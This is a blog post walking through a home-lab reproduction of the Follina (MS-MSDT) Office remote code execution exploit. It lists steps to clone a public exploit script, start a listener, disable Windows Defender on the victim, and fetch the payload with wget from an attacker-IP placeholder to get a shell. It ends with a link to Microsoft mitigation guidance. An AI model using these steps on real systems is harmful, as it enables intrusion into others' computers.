## This post is designed to teach you how to exploit the MS-MSDT Follina vulnerability!

---

### 1. Introduction

*I want to give thanks and credit to **John Hammond** and his work with the Huntress team identifying and showing exactly how this exploit works! Check out his [Youtube](https://www.youtube.com/watch?v=dGCOhORNKRk&ab_channel=JohnHammond) or the Huntress [blog](https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug).*

- At the bottom of this blog post I have a short GIF showing the exploit in action.

- This zero-day is a vulnerability which has been announced and unpatched for the past 2 days as of writing this article.

- The vulnerability takes advantage of the Microsoft Diagnostics Tool (MSDT) and other Microsoft utilities. 

- Basically, the attacker can send you a seemingly harmless word document, however, once you open the document (or even preview pane) the malicious remote code execution happens and the attacker has just infected your computer with a virus, a command and control access point, crypto coin miner, etc.

### 2. My Setup

For my attack computer I ran kali Linux in VMWare Workstation 16 player using NAT and HOST virtualized ethernet adapters.

I ran my victim computer on an evaluation Windows 11 virtualized machine in VMWare Workstation 16 player using a HOST-Only virtualized ethernet adapter.

### 3. Exploit in Action!

John Hammond made the exploit accessible via his GitHub [here](https://github.com/JohnHammond/msdt-follina) as a simple python script which creates the malicious file, opens a listener, and hosts the malicious file.

**Prior to starting the exploit:**

You may have malware protection and defender services for your endpoint hosting these Virtual Machines. It may stop your virtual machines from transferring and running the python script. Therefore, at your discretion you may need to turn off these services to see the functional exploit. 

*Proceed at your own risk*

**On Attack Device**


    #Step 1: 

    git clone https://github.com/JohnHammond/msdt-follina.git

    #Step 2:
    python3 Follina.py -r <port number of choice>

**On victim**

    #Step 3: Disable Windows Defender Real-Time Protection

    #Step 4: Open Powershell

    #Step 5:
    wget <attackerIP>:<port chosen in step 2>

You should have seen the Microsoft Diagnostics Tool load, and then you received connection at your listener on the attacking computer.

### 4. Mitigations

See the current response from [Microsoft](https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/) on how to mitigate the issue until a patch is released.
